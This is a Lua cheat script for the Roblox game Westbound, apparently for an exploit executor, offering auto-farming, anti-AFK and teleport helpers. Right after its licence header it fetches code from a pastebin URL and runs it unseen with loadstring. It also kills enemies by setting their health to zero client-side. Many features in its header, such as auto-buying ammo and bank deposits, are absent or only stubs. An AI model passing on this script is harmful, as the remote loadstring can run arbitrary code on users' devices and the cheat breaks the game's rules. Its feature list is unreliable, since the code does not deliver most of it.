--[[
Westbound Auto Farm Script (For Android/PC - Arceus X Neon or similar software)

My Main Script Link Page:
https://github.com/AkumajouHelp/westbound-script-auto-farm

Features:
- Auto farm coyotes
- Auto sell when inventory full
- Fast auto kill
- Faster teleporting
- Low lag & safe teleports
- Anti-AFK
- Auto respawn
- GUI with toggle buttons
- Teleport to Train Heist
- Instant Deposit to Bank
- Chat command: !togglefarm
- Ammo Smart System:

1. Auto-buy ammo when low

2. On-screen warning when out of ammo

3. Auto-switch to melee if no bullets

-- MIT License
-- Copyright (c) 2025 AkumajouHelp
--
-- Permission is hereby granted, free of charge, to any person obtaining a copy
-- of this script and associated documentation files (the "Script"), to deal
-- in the Script without restriction, including without limitation the rights to
-- use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
-- the Script, and to permit persons to whom the Script is furnished to do so,
-- subject to the following conditions:
--
-- The above copyright notice and this permission notice shall be included in all
-- copies or substantial portions of the Script.
--
-- THE SCRIPT IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-- IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-- FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-- AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-- LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-- OUT OF OR IN CONNECTION WITH THE SCRIPT OR THE USE OR OTHER DEALINGS IN THE
-- SCRIPT.

-- Your actual script code starts here
loadstring(game:HttpGet("https://pastebin.com/raw/5TU8iPKE"))()

-- Services
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local VirtualUser = game:GetService("VirtualUser")

-- Anti-AFK
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    wait(1)
    VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
end)

-- UI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local ToggleFarm = Instance.new("TextButton", ScreenGui)
ToggleFarm.Size = UDim2.new(0, 200, 0, 50)
ToggleFarm.Position = UDim2.new(0, 50, 0, 50)
ToggleFarm.Text = "Start Auto Farm"

local farming = false

ToggleFarm.MouseButton1Click:Connect(function()
    farming = not farming
    ToggleFarm.Text = farming and "Stop Auto Farm" or "Start Auto Farm"
    print("Farm toggled:", farming)  -- Debug line
end)

-- Helper function to move character smoothly
local function moveTo(targetPosition)
    local character = game.Players.LocalPlayer.Character
    if character then
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            local distance = (humanoidRootPart.Position - targetPosition).magnitude
            local speed = 50  -- Adjust for desired speed
            local duration = distance / speed
            local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
            local goal = {Position = targetPosition}
            local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)
            tween:Play()
        end
    end
end

-- Auto Farm Loop
spawn(function()
    while true do
        wait(1)
        if farming then
            print("Farming started.")  -- Debug line
            local enemies = workspace:FindFirstChild("Enemies")
            if enemies then
                for _, mob in pairs(enemies:GetChildren()) do
                    if mob.Name == "Coyote" and mob:FindFirstChild("HumanoidRootPart") then
                        moveTo(mob.HumanoidRootPart.Position + Vector3.new(0,5,0))
                        wait(0.2)
                        mob.Humanoid.Health = 0
                    end
                end
            end

            -- Auto Sell (Teleport to General Store)
            local inv = game.Players.LocalPlayer.Backpack:GetChildren()
            if #inv >= 10 then -- adjust if needed
                moveTo(CFrame.new(-214, 24, 145).Position)  -- General Store position
                wait(0.5)
                -- simulate sell here if needed
            end
        end
    end
end)

-- Auto Respawn
game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
    wait(1)
    print("Auto Respawn triggered.")  -- Debug line
    -- You may add respawn logic if necessary
end)
